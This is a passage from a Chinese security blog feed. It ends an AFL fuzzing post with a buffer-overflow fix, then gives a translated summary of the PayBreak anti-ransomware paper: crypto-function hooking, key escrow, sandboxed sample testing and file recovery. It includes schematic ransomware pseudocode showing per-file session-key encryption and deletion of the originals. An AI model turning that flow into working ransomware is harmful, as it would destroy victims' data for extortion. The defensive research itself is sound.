&quot;%03lo&quot;, uval);</span><br>         (<span class="hljs-type">void</span>) <span class="hljs-built_in">snprintf</span>(b, <span class="hljs-keyword">sizeof</span>(b), <span class="hljs-string">&quot;%03lo&quot;</span>,uval);<br>         output(fp, name, b);<br>     &#125;<br></code></pre></td></tr></table></figure><p>增加缓冲区大小并使用更为安全的<code>snprintf</code>函数。</p><h1 id="参考">参考</h1><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1"class="footnote-text"><span><a href="https://lcamtuf.coredump.cx/afl/QuickStartGuide.txt"class="uri">https://lcamtuf.coredump.cx/afl/QuickStartGuide.txt</a><a href="#fnref:1" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:2"class="footnote-text"><span><a href="https://github.com/google/AFL/releases"class="uri">https://github.com/google/AFL/releases</a><a href="#fnref:2" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><ahref="https://www.mail-archive.com/debian-bugs-dist@lists.debian.org/msg1643066.html"class="uri">https://www.mail-archive.com/debian-bugs-dist@lists.debian.org/msg1643066.html</a><a href="#fnref:3" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:4"class="footnote-text"><span><a href="https://nvd.nist.gov/vuln/detail/CVE-2009-0159"class="uri">https://nvd.nist.gov/vuln/detail/CVE-2009-0159</a><a href="#fnref:4" rev="footnote" class="footnote-backref">↩︎</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>Fuzzing</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fuzzing</tag>
      
      <tag>System Security</tag>
      
      <tag>CVE</tag>
      
      <tag>afl</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PayBreak防勒索系统简析</title>
    <link href="/2021/01/01/A-brief-analysis-of-PayBreak-anti-ransomware-system/"/>
    <url>/2021/01/01/A-brief-analysis-of-PayBreak-anti-ransomware-system/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本文整理翻译自<ahref="https://dl.acm.org/doi/10.1145/3052973.3053035">PayBreak : DefenseAgainst Cryptographic Ransomware</a></p></blockquote><h1 id="简介">简介</h1><p>PayBreak基于假设：文件加密依赖于<ahref="https://mundi-xu.github.io/2020/12/28/勒索软件结构与加密模式研究/">混合加密</a>（译者注：详见我的另一篇文章），其中在受害计算机上使用对称密钥。PayBreak检测到这些密钥的使用，将它们保存在托管中，因此可以解密文件，否则这些文件只能通过支付赎金才能恢复。</p><p>我们认为应对勒索软件威胁的现有技术存在不足（译者注：该文发表自2017年），取而代之的是，我们提出了一种系统，允许有安全意识的用户主动防御勒索软件攻击。，它可以使受害者从勒索软件感染中恢复而无需支付赎金。为此，我们提出了一种密钥托管机制，该机制可将加密密钥安全地存储在密钥库中。</p><p>第一步，用户必须生成一个非对称密钥对，并将公钥添加到系统中。此公共密钥用于加密放置在密钥库中的密钥。在正常运行期间，我们的系统监视在系统上执行的程序，并拦截对实现密码原语的函数的调用。此外，系统会捕获对称加密密钥，并使用公钥对其进行加密，然后将结果存储在密钥库中。一旦用户感染了勒索软件并得知必须支付赎金才能访问文件，其可以简单地用私钥解密密钥库并解密文件而无需支付任何费用。</p><p>经测试，PayBreak系统运行了107种勒索病毒样本（12个家族），成功的恢复了所有加密文件。</p><h2 id="贡献">贡献</h2><ul><li><p>对基于现代加密技术的勒索软件进行了特征分析</p></li><li><p>提出了一种密钥库机制，该机制可以主动防御基于加密的勒索软件</p></li><li><p>在Windows 7操作系统下实现了PayBreak系统</p></li><li><p>通过在受控环境中运行107个勒索软件样本来评估PayBreak，并成功恢复了十二个常见勒索软件家族的任何一个加密的所有文件</p></li><li><p>测试了PayBreak对操作系统和日常使用的性能影响</p></li></ul><h1 id="背景">背景</h1><p>在本节中，我们将讨论现代勒索软件的典型加密流程以及影响勒索软件的实际限制，同时简单介绍PayBreak系统基于的威胁模型。</p><h2 id="practical-considerations-for-ransomware">Practicalconsiderations for ransomware</h2><p>勒索软件的目标是阻止受害者访问其数据并勒索赎金。现代勒索软件借鉴了完善的良性密码套件（例如OpenPGP或S/MIME）中的技术，并采用了所谓的混合密码系统。</p><p>在混合密码系统中，发送者为每个消息（例如，为每个需要加密的文件）选择一个随机对称密钥，并在该密钥下加密每个消息（或文件）。该一次对称密钥通常称为会话密钥。随后，混合密码系统将使用接收者的（非对称）公钥对对称消息专用密钥进行加密。因此，无论加密内容的大小如何，仅需要高性能的非对称对称加密操作即可加密小的对称密钥。然后，将加密的对称密钥与加密的内容组合并发送到服务器。为了解密数据，接收者首先使用其私钥解密加密的对称密钥。有了对称密钥，接收者便可以简单地将数据的密文解密为原始的纯文本。<sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="[勒索软件结构与加密模式研究](https://mundi-xu.github.io/2020/12/28/勒索软件结构与加密模式研究/)">[1]</span></a></sup></p><p>在勒索软件攻击中，攻击者在其攻击服务器上生成了非对称密钥对。在受害者的机器上，恶意软件会为每个加密的文件生成唯一的对称会话密钥。会话密钥使用攻击者的公共密钥加密，并与加密的文件内容一起存储。然后，攻击者向受害者索要赎金以获取指定的私钥解密文件。</p><h2 id="hybrid-cryptography">Hybrid Cryptography</h2><p>如前所述，对称密钥由非对称公钥保护（加密）。在勒索软件的攻击链中，混合加密系统下加密的消息是受害者计算机上的文件。因此，最终勒索软件攻击的强度就等价于混合密码系统的安全性。基于此事实，被加密的用户文件的后验救援尝试是很具有挑战性的。因此，我们提供了一种保护机制，可以绕过现代勒索软件样本所采用的强密码原语的挑战，而不是简单地检测到受害者计算机是否已感染了勒索软件。</p><p>尽管以上讨论似乎是理论性的，但现代勒索软件系列恰恰利用了这种混合密码系统。许多操作系统发行版和平台都包含经过实践检验的加密算法。例如，在Windows上，一种这样的实现是Microsoft的CryptoAPI。CryptoAPI是用于加密功能的安全接口，可以确保在每个Windows操作系统中都存在该接口，因此对于勒索软件作者而言，利用现有的加密功能非常简单。</p><h3 id="ransomware-pseudocode">Ransomware Pseudocode</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++">c2 = <span class="hljs-built_in">ConnectToCommandAndControl</span>();<br><span class="hljs-comment">// Private key kept secret on C2</span><br>pubkey = c<span class="hljs-number">2.</span><span class="hljs-built_in">ReceivePubKey</span>();<br>hPubkey = <span class="hljs-built_in">CryptImport</span>(pubkey);<br>hCsp = <span class="hljs-built_in">CryptAcquireContext</span>();<br><span class="hljs-keyword">while</span> (filename = <span class="hljs-built_in">FindNextFile</span>()) &#123;<br><span class="hljs-comment">// Read</span><br>ptFile = <span class="hljs-built_in">ReadFile</span>(filename);<br><span class="hljs-comment">// Generate random session key per file</span><br>hSymkey = <span class="hljs-built_in">CryptGenKey</span>(hCsp);<br><span class="hljs-comment">// Then encrypt</span><br>ctFile = <span class="hljs-built_in">CryptEncrypt</span>(hSymkey, ptFile);<br>keyblob = <span class="hljs-built_in">CryptExportKey</span>(hPubkey, hSymkey);<br><span class="hljs-built_in">DeleteFile</span>(filename);<br><span class="hljs-comment">// Write encrypted session key</span><br><span class="hljs-built_in">WriteFile</span>(filename, keyblob);<br><span class="hljs-comment">// Append the encrypted file</span><br><span class="hljs-built_in">AppendFile</span>(filename, ctFile);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="threat-model">Threat model</h2><p>本节介绍了我们提出的系统的威胁模型和假设。关于这些假设的详细讨论以及我们为什么认为它们是现实的，请参见后文第6节的讨论部分。我们的威胁模型基于常见且成功的勒索软件，因此，威胁模型考虑已在受害者计算机上成功安装且可运行恶意软件的攻击者。此外，我们的威胁模型中的操作系统是可信和经常维护更新的，即我们假设恶意软件不能提权，因为这也会破坏任何现有的计算机保护机制（如反恶意软件解决方案）。即使我们假设勒索软件仅以用户级特权执行，但大多数现代恶意软件都是被加壳过的。因此，我们的威胁模型假设恶意软件仅由普通的软件加壳。更准确地说，威胁模型只考虑可以运行时脱壳的二进制文件，而不考虑那些应用高级策略或基于仿真的加壳软件（如Themida）。</p><p>我们承认，更复杂的壳和混淆技术可能会破坏我们提出的系统。尽管此类技术已广为人知，但这些技术在整个恶意软件社区中并未受到广泛应用，而且至少我们提出的方法大大提高了恶意软件作者绕过保护的门槛（即攻击者必须克服这些难题）。</p><p>最后，我们假设用户可以创建一个非对称密钥对来使用我们的系统，并且在感染勒索软件之前就完成了系统设置（即勒索软件的加密操作发生在系统构建完成之后）。</p><h1 id="概述">概述</h1><p>PayBreak系统由三个不同的组件构成，该系统能够恢复由混合密码系统勒索软件加密的文件。在本节中，我们将简单介绍这些组件及其在系统中的作用。下图概述了PayBreak的工作方案。用户使用非对称密钥对（pku，sku）的公钥（pku）配置PayBreak，而私钥（sku）存储在可信设备上。</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/PayBreak防勒索系统简析/overview.png"alt="Overview of PayBreak" /><figcaption aria-hidden="true">Overview of PayBreak</figcaption></figure><p>系统将计算机上使用的所有加密会话密钥连续存储在安全密钥库中，当用户的计算机不幸感染勒索软件时，则可以使用私钥sku访问系统的密钥库，然后使用存储在密钥库中的数据解密文件。</p><p>该系统利用了以下事实：在混合密码系统中，攻击者必须在对称加密期间使用会话密钥。在实际的勒索软件攻击中，这种加密必须在用户的计算机上进行。基于这一特征，我们可以绕过对现代勒索软件所采用的强大加密技术的破解。</p><h2 id="crypto-function-hooking">Crypto Function Hooking</h2><p>勒索软件的作者需要安全可靠的现代加密技术，因此，当今的恶意软件作者可以选择动态链接（系统提供的）密码库，也可以将外部库静态链接到他们的代码中。</p><p>PayBreak支持两种类型的链接方式，并通过它们的名称和地址识别动态链接库中的加密过程，而静态链接过程则基于模糊字节签名（译者注：疑似模糊哈希算法的应用）进行标识。然后在这些过程的位置生成hook。Hook从这些加密过程改变程序控制流，并导出会话密钥以及对称加密方案的其他任何参数。导出数据后，系统将控制权返回到原始加密过程，程序继续正常进行。</p><h2 id="key-vault">Key Vault</h2><p>用于恢复对称加密数据的密钥材料和算法详细信息（如上所述，从hook过程中恢复并提取导出）存储在安全加密的密钥库中。由于勒索软件可能以密钥库为目标，我们的实现将获取的密钥存储到一个Append-Only的文件中，且该文件受管理员权限保护。在我们的测试中，这种完整性机制已经足够。但是，我们在第六节中讨论了进一步的关键库完整性改进。密钥库的内容使用用户的公共密钥安全地加密，由于在存储之前已对其进行过加密，我们确保密钥库对用户而言是安全的。</p><h2 id="file-recovery">File Recovery</h2><p>假如用户不幸感染了勒索软件且文件都被加密，则可以使用用户的私钥sku访问密钥库。PayBreak用于访问加密被勒索的文件时的密钥和算法信息。算法详细信息用于配置与加密时相同的对称加密方案，并且使用保存的密钥与该配置一起尝试恢复文件。因为勒索软件通常会存储元数据，例如原始文件长度，加密日期和加密密钥数据等信息，所以在加密开始时，实际的加密文件数据通常会在该元数据的固定偏移处。在解密之前，PayBreak将通过测试确定加密文件的正确偏移。</p><h1 id="详细实现">详细实现</h1><p>我们在Windows7上实现了原型系统PayBreak，主要部分为Hook由Microsoft的CryptoAPI和Crypto++库执行的加密。该实现还使用了微软CryptoAPI中的加密技术来安全地存储勒索软件使用的会话密钥。</p><h2 id="crypto-function-hooking-1">Crypto Function Hooking</h2><p>Hooking是一种通过使用任意新函数修改原始函数来改变应用程序行为的技术。在Windows中，可以通过多种方式来hook函数，范围从修改进程的“ImportAddress Table”到注入DLL。我们的原型系统使用MicrosoftResearch的Detours库进行hooking。Detours首先从原始函数的内存地址的开头至少保存5个字节（x86汇编中无条件的JMP指令的大小）来hook函数。由于x86体系结构中的指令长度可变，保存的字节数可能超过5个字节。Hook函数还会包含需要添加的新代码，对PayBreak而言，就是将会话密钥和算法参数导出到密钥库。在新创建的hook函数末尾，Detours会创建一条无条件跳转指令，将控制权移回原始函数并跳过hook函数。即在每个函数的前5个字节（可能更多）放一个jmp，跳到hook函数，hook函数结尾再jmp回原控制流处。</p><p>为了激活hook并将程序控制流从原始函数重定向到hook函数，对hook函数的jmp将覆盖原始函数中的前五个字节。这样就完成了hooking，并且对原始函数的所有调用现在都将重定向到hook。我们的系统采用此方案进行hooking，并将其自身插入Windows7计算机上启动的每个新进程中。</p><p>勒索软件作者一般通过动态链接到系统提供的加密库或静态链接外部库以将加密技术纳入其恶意软件中，这两种链接方式给系统的hooking带来了不同的困难。</p><h3 id="hooking-in-dynamically-linked-libraries">Hooking in dynamicallylinked libraries</h3><p>几十年来，Windows一直将功能丰富的加密库作为其平台的一部分，从而使得恶意软件很容易动态链接到Windows上的加密库。微软的CryptoAPI只允许通过一组具有特殊访问权限的子例程进行操作，从而隐藏密钥及其在内存中的位置等敏感信息。CryptoAPI的安全性、平台一致性和API完整性使其成为勒索软件作者进行本地文件加密的常用选择。微软的CNG库是经典CryptoAPI的可选替代品（两者都包含在windows7中），但使用方式基本相同，PayBreak也能无缝切换处理。</p><p>由于CryptoAPI抽象和不透明的设计，会话密钥的使用和导出只能通过特定的CryptoAPI过程来完成。通过CryptoAPI进行的所有加密都必须通过CryptEncrypt函数执行，或者必须通过CryptExport函数导出（供外部使用）。基于CryptoAPI的勒索软件使用CryptoAPI的CryptEncrypt函数来执行文件的本地加密。因为CryptoAPI是动态链接的，所以添加hook完全独立于调用过程，并且恶意软件的混淆不会影响此功能。利用在CryptEncrypt中配置的hook，PayBreak可以使用CryptExportAPI函数安全地导出会话密钥。</p><p>虽然CryptEncrypt中的hook函数成功导出了会话密钥，但并未包含诸如加密模式和初始化向量之类的算法详细信息。为了获得这些参数，然后重新恢复相同的加密配置，我们的系统挂接了CryptAcquireContext和CryptSetKeyParam函数。CryptAcquireContext的hook函数为PayBreak提供了用于加密的算法信息，包括默认参数。对这些参数的更改是使用CryptSetKeyParam函数执行的，同样的此API函数也已被hooking。</p><p>除了使用CryptoAPI进行加密之外，用户可能希望使用API来生成安全的加密用随机数，而该随机数可用于导出另一个加密功能的会话密钥。就Window而言，生成随机数的受支持的API是CryptGenRandom，许多加密库（如OpenSSL，NaCl，LibTomCrypt等）都利用此API来实现其加密安全的伪随机数生成器（CSPRNG）。通过动态hooking并记录此系统函数，PayBreak存储用于生成许多会话密钥的基础信息，这些会话密钥将在勒索软件动态或静态链接这些库时所使用。</p><h3 id="hooking-in-statically-linked-libraries">Hooking in staticallylinked libraries</h3><p>静态链接加密库的勒索软件迫使PayBreak采用稍微不同的方法。静态链接的库嵌入在应用程序的可执行代码中，会受到混淆的影响。因此，PayBreak会在运行时从进程的内存中识别加密过程，然后hooking。为此，我们的系统使用32字节的fuzzy function signatures来标识静态链接的库函数。这种方法类似于IDA的快速库识别和识别技术（FLIRT）。</p><p>签名由已知加密过程的前32个字节组成，当在内存中连续识别到这32个字节且超过阈值百分比时，系统将标识该进程。因为通常恶意软件会被加壳，所以PayBreak会扫描所有已执行进程的可执行内存，以查找函数签名。我们的原型系统将在每个进程第一次调用NtReadFile之后执行扫描，因为恶意软件必须先读取数据才能加密用户文件。识别到函数签名后，通过使用Detours去hook并导出会话密钥和加密算法的详细信息。尽管我们当前的原型系统可以有效抵御当代勒索软件，但高级加壳技术和混淆仍然可以绕过保护系统。可以利用对加密功能的语义检测加强对勒索软件的识别<sup id="fnref:2" class="footnote-ref"><a href="#fn:2" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="P. Lestringant, F. Guih´ery, and P.-A. Fouque. Automated identification of cryptographic primitives in binary code with data flow graph isomorphism. In Proceedings of the 10th ACM Symposium on Information, Computer and Communications Security, ASIA CCS ’15, 2015.">[2]</span></a></sup>。</p><p>我们的原型系统实现带有Crypto++静态链接库的签名，由Crypto++的SetKey，CipherModeBase和SymmetricCipherBase类方法的前32个字节组成，并通过CryptoAPI的CryptExportAPI函数导出Crypto++会话密钥和算法详细信息。</p><h2 id="key-vault-1">Key Vault</h2><p>我们假设MicrosoftCryptoAPI和Crypto++使用的对称密钥和有关对称加密方案的详细信息使用安全的方法存储，只有在必要时才能由勒索软件的受害者访问。我们可以发现PayBreak的密钥库系统的设计与勒索软件部署的混合密码系统极其相似，都使用系统安装过程中生成的用户公共密钥（pku）对会话密钥进行加密和导出。我们的实现为此步骤使用的是2048位RSA密钥，可确保对小于或等于密钥大小的数据进行安全的加密-对于一般的256位对称密钥而言已经足够。</p><p>如前一节所述，CryptExcrypt函数的行为增加了对CryptEncrypt的调用。CryptExport调用会将传递给CryptEncrypt函数的会话密钥的句柄以及我们系统的交换密钥（即用户的pku）作为参数以安全地导出会话密钥，同时CryptEncrypt也会导出使用密钥的算法（即AES，3DES，RC4等）信息。</p><p>此外，为了重建勒索软件感染所使用的对称加密配置，我们必须保存算法参数，例如初始化向量（IV）和使用的分组密码模式等，这些信息都是从hook中提取的。Hook对传递给CryptAcquireContext和CryptSetKeyParam函数的参数进行记录。与加密消息语法<sup id="fnref:3" class="footnote-ref"><a href="#fn:3" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="[Cryptographic Message Syntax (CMS)](https://www.ietf.org/rfc/rfc5652.txt)">[3]</span></a></sup>相似，因为它们的公开不会影响现代密码系统的安全性，所以这些参数以明文形式连接到会话密钥信息。此串联的“blob”被附加到PayBreak的密钥库中。此外，如前所述，我们的原型实现将传递给Crypto++函数的加密密钥信息（简单字节数组）存储到密钥库中。系统还存储从CryptGenRandom函数调用的可用于逆向勒索软件以重新创建用于加密文件的会话密钥输出的随机字节。</p><p>为安全起见，防止文件库本身被勒索软件加密，文件库配置为append-only，并且仅允许WindowsAdministrator组进行所有其他访问。如果密钥库需要访问，则使用在安装PayBreak期间设置的私钥（sku）来解密存储的密钥材料，从而访问各个会话密钥和加密方案的参数。</p><h2 id="file-recovery-1">File Recovery</h2><p>PayBreak的最后一个组成部分是勒索软件感染期间加密的文件的恢复。文件恢复分三个阶段进行。首先使用存放的私钥访问密钥库，然后将保管库中的数据解析为对称密钥和相应的加密方案参数，例如块密码模式和初始化向量，最后把检索到的会话密钥用于解密受害者的文件。通常，由勒索软件加密的每个文件都与元数据（例如勒索软件版本和加密文件的原始大小）连接在一起。由于这种元数据，实际的加密文件数据通常会在为赎金而保留的文件中发生偏移。在不了解每个勒索软件的单独元数据结构的情况下，我们的系统被迫对保存在勒索文件中的每个可能偏移量进行测试。我们的系统利用动态编译来降低后续文件解密所需的工作量，一旦找到成功的偏移量，以后将在先前成功的偏移量处尝试文件解密。</p><p>PayBreak迭代尝试使用每个托管密钥和每个偏移量解密文件，直到达到解密状态（libmagic<sup id="fnref:4" class="footnote-ref"><a href="#fn:4" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="[Fine Free File Command](http://www.darwinsys.com/file/)">[4]</span></a></sup>未将其识别为“data”）为止。一旦将解密状态标识为常见的Office文档文件类型，例如MicrosoftWord文档，JPEG图像或PDF文件，该状态将另存为实际的解密文件。当然，如果生成的文件被错误地标记为已解密，则用户可以指示系统继续搜索，直到标识了正确的键和偏移量为止。此外，尽管我们可以改进这种未优化的暴力破解方法，但至少它成功地恢复了测试的加密用户文件，<del>有用就行不是吗</del>。</p><h1 id="测试评估">测试评估</h1><p>如上一节所示，我们在Windows 7上实现了PayBreak。基于此原型实现，我们对系统进行了测试评估并回答了以下问题：</p><ul><li><strong>RQ1</strong>PayBreak可以保护用户免受真实的勒索软件的威胁吗？（即PayBreak是否可以还原由市面上流通的勒索软件加密的文件）</li><li><strong>RQ2</strong>是否需要对软件进行特定的修改才能还原不同勒索软件采用的加密？</li><li><strong>RQ3</strong>将PayBreak作为一种实时的在线保护机制运行会对性能产生什么影响？</li></ul><p>这些问题旨在回答所提出技术的实用性问题。 RQ1着重该技术是否有效。显然，一个不能完成预定功能的系统在对抗勒索软件方面的帮助有限。RQ2探索了所提出系统的多功能性。在这种情况下，通用方法比需要不断完善以解决以前未知的勒索软件系列所面临的挑战的技术更为可取。最后，RQ3解决了一个实际的部署问题。与流行的防病毒解决方案类似，我们将PayBreak设计为一种在线保护机制，因此，对常见用例和工作负载的高性能影响将对在工作环境采用这种机制构成重大障碍。</p><h2 id="dataset">Dataset</h2><p>为了测试PayBreak的功能和有效性，我们需要获取主动加密勒索软件的样本。为了收集这些样本，我们开发了实时自动化的发现，检测和警告勒索软件（RADDAR）系统。该项目将被开源，以帮助进一步研究勒索软件。RADDAR会在各个位置抓取恶意软件样本。 更准确地说，我们从VirusTotalIntelligence获得了样本，该样本提供了针对恶意软件样本的高级搜索功能和下载功能。我们搜索了新提交的样本（即在分析后一周内提交的样本），这些样本也被至少两个反病毒供应商标记，并且包含在<ahref="https://www.trendmicro.com/vinfo/us/security/definition/ransomware#List_of_Known_Ransomware_Families">Listof Known RansomwareFamilies</a>中。除了这些流行的勒索软件系列之外，我们还下载了基于通用搜索词的示例：勒索，加密或锁定。除VirusTotal外，我们还对各种恶意软件存储库进行了爬取，包括Malc0de和VXVault。</p><p>RADDAR一旦发现恶意软件样本，就会检测该恶意软件样本是否为基于加密的勒索软件，以及是否正在执行其恶意行为。为此，我们利用了Cuckoo Sandbox动态分析框架，其中每个样本运行20分钟。我们使用Cuckoo通过在KVM8中运行的受监视Windows7虚拟机（VM）中执行每个样本来分析并输出每个样本的行为报告。此外，除了在纯净的Windows7安装包中找到的默认文件之外，我们还通常在计算机上的各个目录中放置经过重新封装的文件类型（PDF，图像，源代码和Word文档）。最后，我们在虚拟机中添加了PayBreak，这使我们能够执行此评估中介绍的测试。我们拍摄了文件系统的快照，并将在感染之前在系统上找到的这些文件称为“honeyfiles”（蜜罐）。</p><p>在由Cuckoo分析恶意软件样本之后，RADDAR会对Cuckoo结果进行分析，以生成包含各种指标的报告，其中包括样本是否处于活动状态以及PayBreak是否提取了加密期间使用的密钥。基于以下特征，我们认为勒索软件样本处于活动状态：</p><ol type="1"><li><p>覆盖，删除或重新创建至少一个honey file</p></li><li><p>新文件被libmagic标识为数据。</p></li></ol><p>需要注意的是，libmagic已经成功标识了原始状态下honeyfiles的真实内容，因此，如果类型更改为数据，则样本必须已对其进行了修改。</p><p>为了确定勒索软件的家族，我们对AV标签进行了多数表决（即采用与Kharraz等人相同的方法<sup id="fnref:5" class="footnote-ref"><a href="#fn:5" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="A. Kharraz, W. Robertson, D. Balzarotti, L. Bilge, and E. Kirda. Cutting the Gordian Knot: A Look Under the Hood of Ransomware Attacks. In Proceedings of the International Conference on Detection of Intrusions and Malware, and Vulnerability Assessment (DIMVA), volume 9148 of Lecture Notes in Computer Science, Milan, Italy, July 2015. Springer International Publishing.">[5]</span></a></sup>）。我们让RADDAR运行了4个月，以收集和生成有关1,691个恶意软件样本的报告，其中713个与AV公司使用的勒索软件标签匹配。下图给出了该分析的详细分类。</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/PayBreak防勒索系统简析/sample_summary.png"alt="Summary of analysis results. Sample count for each category is in parentheses" /><figcaption aria-hidden="true">Summary of analysis results. Sample countfor each category is in parentheses</figcaption></figure><p>与之前的恶意软件研究一致，我们数据集中的许多样本由于各种原因没有显示任何恶意功能（即，它们处于非活动状态）。因此，我们进行了以下两步分析。首先，识别活动样本，然后尝试推断非活动样本未显示任何恶意行为的原因。如前所述，安全使用混合加密的勒索软件必须从命令和控制结构（C&amp;C）检索公钥pk。因此，如果恶意软件不产生任何网络流量，就无法安全地应用混合加密。如果所有观察到的TCP和UDP流量都专门针对Windows附属的域（例如用于计时和更新的域），则我们将样本分类为“无网络”。</p><p>此外，如果所有DNS查询（针对Microsoft域的查询除外）都返回否，或者所有HTTP请求均生成404状态代码，则将样本分类为“已禁用C＆C”。在分析的非活动样本中，那些报告为具有禁用的C＆C的样本都是由于DNS查询返回错误。但是，我们没有对由恶意软件生成的受HTTPS保护的网络流量进行分析。最后，即使C＆C可操作且可访问，但如果检测到环境敏感型恶意软件在沙盒环境中运行，它也将避免执行。“Environment”表示恶意软件可能正在分析其环境以检测其是否在虚拟环境（例如KVM或VirtualBox）中运行。如果Cuckoo的内置检测程序将样本标识为“Environment”，则该样本将被标记为“Environment”。</p><p>至于无法确定其余样品没有运行的原因，以前的经验表明，这可能是由于更高级的环境指纹识别，对用户活动的依赖性或逻辑（定时）炸弹的使用而导致执行延迟超过我们的20分钟评估阈值。最后，我们针对20个活跃的勒索软件系列评估了我们的系统，这是我们所知道的最大的勒索软件研究。</p><h2 id="paybreak-effectiveness">PayBreak Effectiveness</h2><p>在本部分中，我们回答RQ1，PayBreak可以还原真实勒索软件执行的加密吗？和RQ2一样，是否需要对恶意软件家族进行特定的修改才能还原不同勒索软件家族采用的加密？</p><p>PayBreak能够从具有已知加密签名的所有勒索软件系列中恢复被勒索的文件。我们的结果证实，我们能够成功融入现实勒索软件样本的加密功能并提取会话密钥以及用于文件恢复的所有必要材料。更具体地说，PayBreak击败了20个活跃勒索软件家族中的12个，据我们所知，其中9个以前从未被击败。如果存在可以完全恢复被勒索文件的方法或技术，那么这个勒索软件就是失败的。PayBreak成功恢复了由CryptoWall和Locky加密的文件，Locky是2016年在经济上最成功的三个勒索软件系列中的两个，而仅CryptoWall便获得了超过3.25亿美元的收入。</p><p>下表中显示了活跃勒索软件系列的摘要。给定系列的活跃勒索软件数量在Samples列中指定。对于以前被勒索的勒索软件样本，该列中包含相应的参考。我们不认为泄漏的加密密钥（例如从攻击者的服务器获得）是失败的，因为这是针对勒索软件的活动，并不意味着勒索软件系列的实施不力。PayBreak展示了使用多种加密库（包括MicrosoftCryptoAPI和Crypto++）击败勒索软件的能力。</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/PayBreak防勒索系统简析/Active_Ransomware_Samples.png"alt="Active Ransomware Samples" /><figcaption aria-hidden="true">Active Ransomware Samples</figcaption></figure><p>PayBreak在运行时为PayBreak成功的样本提取了用于加密的加密算法，并在“算法”列中列出。对于未成功的样本，该列包含其他研究人员研究的信息，这些信息是我们尽可能收集的，并提供了相应的参考。此外，“击败”列还标识了通过先前技术或PayBreak被击败的所有软件。</p><p>在我们的样本库中的20个活跃家庭中，PayBreak失败了8个。其中的三个DXXD，PokemonGo和VirLock先前被击败，其使用琐碎的常量密钥进行加密，即它们未使用混合加密。另外两个家庭，MarsJokes和Troldesh，也先前被击败。与流行的方式相反，这些系列使用了自己的伪随机数生成器，而不是使用经过了实战测试的CryptGenRandomAPI。其余没有成功的软件家族，Androm，Razy和TeslaCrypt使用一个密码库，而我们的原型实现并未设置为可hook的。PayBreak可以扩展，以通过hooking它们各自的静态链接的加密功能，然后将其恒定密钥（对于琐碎的家族）导出，或将其会话密钥导出到密钥库中，从而击败其余八个家族。接下来，我们讨论系统所使用签名的鲁棒性。</p><h3 id="signature-robustness">Signature Robustness</h3><p>为了识别静态链接的加密库，PayBreak依赖于签名。因此，一个明显的问题是这些签名对混淆的鲁棒性。与所有实用的在线反恶意软件免杀方案一样，足够级别的混淆和欺骗可以规避PayBreak提供的保护。但是，请注意，运行时脱壳的二进制文件不会对PayBreak造成问题。为了评估签名的鲁棒性，我们根据不同编译器和优化级别引入的语法更改来评估它们，因为攻击者可以轻松更改这些特征。为此，我们编译了12个程序，这些程序使用具有不同编译器和优化设置的Crypto++加密库。更准确地说，我们的示例程序静态链接了Crypto++版本5.6.3、5.6.2和5.6.1，包含了这个流行的Windows加密库开发的五年时间。此外，我们使用tdm-gcc和mingw32-gcc编译器编译了程序，每个编译器都具有禁用的优化功能和最大优化级别。要识别加密功能的所有12个变体，我们必须开发两个签名。原因是，使用不同的编译器时，工件之间的差异很大，但对于不同的优化级别，差异就较小。本质上，我们必须为每个编译器创建一个签名，并且每个签名在所有经过测试的优化级别和库版本中都是可靠的。</p><h3 id="file-recovery-2">File Recovery</h3><p>PayBreak能够从十二个软件中完全恢复加密文件。由于我们正在处理大量样本，因此我们的RADDAR系统只会执行每个样本20分钟。但是，为了评估性能和恢复整个文件系统的能力，我们在可重置的测试环境中执行了四个勒索软件系列，每个系列运行了四个小时。为了开发此测试环境，首先，我们在整个虚拟机的整个文件系统中随机分布于标准化文档库Govdocs1线程。文档语料库包含9,876个文件，这些文件主要是常见的办公类型，例如.xls，.docx和.pdf。对于每个文件，我们记录其原始SHA1文件哈希。通过比较这些文件哈希，我们可以确定我们恢复的文件是否为原始文件。然后，我们执行了一个勒索软件家族，并在没有干预的情况下运行了四个小时。感染完成后，我们将系统上的所有文件提取到安全的环境中。PayBreak尝试使用从系统中提取的密钥保险库恢复这些文件。然后，我们重置虚拟机，并对每个系列重复此过程。</p><p>在对文件系统进行勒索软件加密之后，我们执行了PayBreak解密。我们的系统能够从每种攻击中恢复100％的原始加密文件。与先前生成的原始文件哈希值进行比较对于恢复不是必需的，使用先前生成的文件哈希值仅可作为成功文件恢复的确认。Locky样本对9,821个文件进行了加密，并在360m40s内恢复了文件。Cryptowall样本对文档语料库中的204个文件进行了加密，并在86s内恢复了文件。AlmaLocker样本对我们文档语料库中的271个文件进行了加密，而受影响的文件在26s内被恢复。Cryptowall和AlmaLocker样本对少量文件进行了加密，可能是由于恶意软件的不稳定性所致，即它们在执行过程中崩溃了；但是，尽管如此，这些测试证明PayBreak能够在短时间内，即整个文件系统几小时的规模内，从勒索软件攻击中完全恢复所有文件。</p><h2 id="performance-impacts">Performance 